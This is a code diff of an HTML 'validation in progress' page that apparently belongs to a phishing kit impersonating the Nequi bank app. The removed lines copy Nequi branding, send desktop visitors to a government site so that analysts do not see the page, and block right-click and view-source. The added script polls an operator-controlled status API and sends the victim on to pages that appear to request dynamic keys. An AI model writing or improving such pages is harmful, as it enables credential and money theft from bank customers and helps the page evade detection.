@@ -1,185 +1,175 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <title>Nequi - Validación</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta http-equiv="pragma" content="no-cache">
-  
-  <link rel="stylesheet" type="text/css" href="login_files/normalize.css">
-  <link rel="stylesheet" type="text/css" href="login_files/nequi_two.webflow.css">
-  <link rel="stylesheet" type="text/css" href="login_files/nequi_one.webflow.css">
-  <link rel="stylesheet" type="text/css" href="login_files/main2.css">
-  <link rel="shortcut icon" type="image/x-icon" href="https://transacciones.nequi.com/bdigital/images/favicon.ico">
-
-  <style>
-    body {
-      font-family: 'Manrope', sans-serif;
-      background-color: #ffffff;
-      margin: 0;
-      padding: 0;
-    }
-
-    .wrap-header {
-      background-color: #ffffff;
-      padding: 20px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-
-    .logo img {
-      height: 32px;
-    }
-
-    .login-section {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 70vh;
-      padding: 20px;
-    }
-
-    .login-wrap {
-      max-width: 500px;
-      text-align: center;
-    }
-
-    h1 {
-      color: #200020;
-      font-size: 1.8rem;
-      font-weight: 700;
-      margin-bottom: 30px;
-    }
-
-    .wrap-input4 {
-      background: #f8f9fa;
-      border-radius: 12px;
-      padding: 40px 20px;
-    }
-
-    .wrap-input4 img {
-      width: 80px;
-      margin-bottom: 20px;
-    }
-
-    .textypn2 {
-      margin: 20px 0;
-    }
-
-    .model {
-      font-size: 16px;
-      color: #200020;
-      line-height: 1.6;
-      display: block;
-    }
-
-    .label-input101 {
-      font-size: 14px;
-      color: #666;
-      font-style: italic;
-    }
-
-    @media (max-width: 768px) {
-      h1 {
-        font-size: 1.5rem;
-      }
-
-      .model {
-        font-size: 15px;
-      }
-    }
-  </style>
-
-  <script type="text/javascript">
-    // Función para redireccionar después de 20 segundos
-    function startRedirectTimer() {
-      let secondsLeft = 20;
-      const interval = setInterval(function() {
-        secondsLeft--;
-        console.log("Redirigiendo en " + secondsLeft + " segundos");
-        
-        // Cuando el contador llegue a 0, redirigir
-        if (secondsLeft <= 0) {
-          clearInterval(interval);
-          window.location.href = "dinamica.html"; // Cambia esta ruta si necesitas
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación en curso</title>
+    <style>
+        body {
+            font-family: 'Manrope', sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
         }
-      }, 1000);
-    }
-
-    // Iniciar el temporizador cuando la página haya cargado
-    window.onload = startRedirectTimer;
-  </script>
+        .container {
+            max-width: 500px;
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #200020;
+            margin-bottom: 20px;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #DA0081;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin: 20px 0;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: 600;
+        }
+        .status.checking {
+            background: #fff3cd;
+            color: #856404;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+    </style>
 </head>
 <body>
-
-  <div id="content">
-    <!-- Header -->
-    <header>
-      <div class="wrap-header">
-        <div class="logo">
-          <a href="#">
-            <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
-          </a>
-        </div>
-      </div>
-    </header>
-
-    <!-- Sección de validación -->
-    <section class="login-section">
-      <div class="login-wrap">
+    <div class="container">
         <h1>Validación en curso</h1>
-        <div class="wrap-input4 validate-input">
-          <center>
-            <img src="https://imagizer.imageshack.com/img923/8701/hMwrLE.gif" alt="Cargando...">
-          </center>
-          
-          <div class="textypn2">
-            <span class="model">
-              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
-            </span>
-          </div>
-          
-          <br>
-          <center>
-            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
-          </center>
+        <div class="loader"></div>
+        <p>Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.</p>
+        <div id="status" class="status checking">
+            🔄 Verificando información...
         </div>
-      </div>
-    </section>
-  </div>
+        <p style="font-size: 0.9em; color: #999;">
+            Por lo general este proceso no demora más de 2 minutos.
+        </p>
+    </div>
 
-  <script>
-    // Detectar dispositivo
-    function detectar_dispositivo() {
-      var dispositivo = "";
-      if (navigator.userAgent.match(/Android/i)) dispositivo = "Android";
-      else if (navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
-      else if (navigator.userAgent.match(/iPhone/i)) dispositivo = "iPhone";
-      else if (navigator.userAgent.match(/iPad/i)) dispositivo = "iPad";
-      else if (navigator.userAgent.match(/iPod/i)) dispositivo = "iPod";
-      else if (navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
-      else if (navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
-      else dispositivo = "PC";
-      return dispositivo;
-    }
-  
-    // Redirigir si es PC
-    if (detectar_dispositivo() == "PC") {
-      window.location.href = "https://www.dian.gov.co/";
-    }
-  
-    // Bloquear teclas específicas y clic derecho
-    document.addEventListener("keydown", function (e) {
-      if (e.ctrlKey && (e.key === "u" || e.key === "U")) {
-        e.preventDefault();
-        alert("Esta acción está bloqueada.");
-      }
-    });
-  
-    document.addEventListener("contextmenu", function (e) {
-      e.preventDefault();
-      alert("El clic derecho está deshabilitado en esta página.");
-    });
-  </script>
-  
+    <script>
+        const userId = localStorage.getItem("userId");
+        const statusDiv = document.getElementById("status");
+        let checkCount = 0;
+        const maxChecks = 40; // 40 intentos x 3 segundos = 2 minutos
+
+        if (!userId) {
+            console.log("No userId found, redirecting...");
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 1000);
+        }
+
+        // Función para verificar estado
+        async function checkStatus() {
+            try {
+                // Obtener la URL base actual
+                const baseUrl = window.location.origin;
+                const response = await fetch(`${baseUrl}/api/check-status?userId=${userId}`);
+                
+                if (!response.ok) {
+                    console.error('API response not ok:', response.status);
+                    checkCount++;
+                    if (checkCount >= maxChecks) {
+                        statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
+                        setTimeout(() => {
+                            window.location.href = "dinamica.html";
+                        }, 2000);
+                        return true;
+                    }
+                    return false;
+                }
+
+                const data = await response.json();
+                checkCount++;
+
+                if (data.status === 'approved') {
+                    statusDiv.className = 'status success';
+                    statusDiv.textContent = '✅ Verificación exitosa';
+                    setTimeout(() => {
+                        window.location.href = data.nextPage || 'finish.html';
+                    }, 1000);
+                    return true;
+                } else if (data.status === 'retry') {
+                    statusDiv.className = 'status success';
+                    statusDiv.textContent = '🔄 Redirigiendo...';
+                    setTimeout(() => {
+                        window.location.href = data.nextPage || 'dinamica.html';
+                    }, 1000);
+                    return true;
+                } else if (data.status === 'error') {
+                    statusDiv.className = 'status success';
+                    statusDiv.textContent = '⚠️ Redirigiendo...';
+                    setTimeout(() => {
+                        window.location.href = data.nextPage || 'neq.html';
+                    }, 1000);
+                    return true;
+                } else if (checkCount >= maxChecks) {
+                    // Timeout después de 2 minutos
+                    statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
+                    setTimeout(() => {
+                        window.location.href = 'dinamica.html';
+                    }, 2000);
+                    return true;
+                }
+
+                return false;
+            } catch (error) {
+                console.error('Error checking status:', error);
+                checkCount++;
+                
+                // Si falla muchas veces, redirigir
+                if (checkCount >= maxChecks) {
+                    statusDiv.textContent = '⏱️ Tiempo agotado, redirigiendo...';
+                    setTimeout(() => {
+                        window.location.href = "dinamica.html";
+                    }, 2000);
+                    return true;
+                }
+                
+                return false;
+            }
+        }
+
+        // Verificar cada 3 segundos
+        const interval = setInterval(async () => {
+            const shouldStop = await checkStatus();
+            if (shouldStop) {
+                clearInterval(interval);
+            }
+        }, 3000);
+
+        // Primera verificación después de 2 segundos
+        setTimeout(() => {
+            checkStatus();
+        }, 2000);
+    </script>
 </body>
 </html>
